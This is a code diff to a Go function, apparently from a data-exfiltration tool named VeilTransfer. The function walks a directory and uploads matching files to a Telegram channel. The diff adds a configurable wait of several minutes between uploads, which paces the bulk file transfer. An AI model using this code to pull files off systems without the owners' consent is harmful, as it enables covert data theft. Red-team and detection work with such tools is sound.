@@ -1,17 +1,19 @@
 package transfer
 
 import (
-    "github.com/go-telegram-bot-api/telegram-bot-api/v5"
     "fmt"
     "os"
-    "VeilTransfer/utils"    
+    "client/utils"
+    "time"
+    "github.com/go-telegram-bot-api/telegram-bot-api/v5"
 )
 
-func UploadTelegram(bot *tgbotapi.BotAPI, localPath string, channelID int64, includePatterns []string) error {
+// UploadTelegram uploads files to a Telegram channel or chat
+func UploadTelegram(bot *tgbotapi.BotAPI, localPath string, channelID int64, includePatterns []string, scheduleInterval int) error {
     return utils.WalkAndUpload(localPath, "", includePatterns, func(localFilePath, _ string) error {
         fileInfo, err := os.Stat(localFilePath)
         if err != nil {
-            return fmt.Errorf("[-] failed to stat local file: %s", err)
+            return fmt.Errorf("\n[-] Failed to stat local file: %s", err)
         }
 
         if fileInfo.IsDir() {
@@ -21,6 +23,7 @@ func UploadTelegram(bot *tgbotapi.BotAPI, localPath string, channelID int64, inc
 
         fmt.Printf("[*] Attempting to upload file: %s to Telegram channel ID: %d\n", localFilePath, channelID)
 
+        // Progress tracking
         progress := make(chan int64, 1)
         go func() {
             for p := range progress {
@@ -33,9 +36,17 @@ func UploadTelegram(bot *tgbotapi.BotAPI, localPath string, channelID int64, inc
 
         _, err = bot.Send(sendDoc)
         if err != nil {
-            return fmt.Errorf("[-] failed to upload file to Telegram: %s", err)
+            return fmt.Errorf("\n[-] Failed to upload file to Telegram: %s", err)
+        }
+
+        fmt.Printf("[+] Successfully uploaded: %s\n", localFilePath)
+
+        // If scheduling is enabled, wait before the next upload
+        if scheduleInterval > 0 {
+            fmt.Printf("[*] Waiting %d minutes before uploading next file...\n", scheduleInterval)
+            time.Sleep(time.Duration(scheduleInterval) * time.Minute)
         }
 
         return nil
-    })
+    }, scheduleInterval)
 }
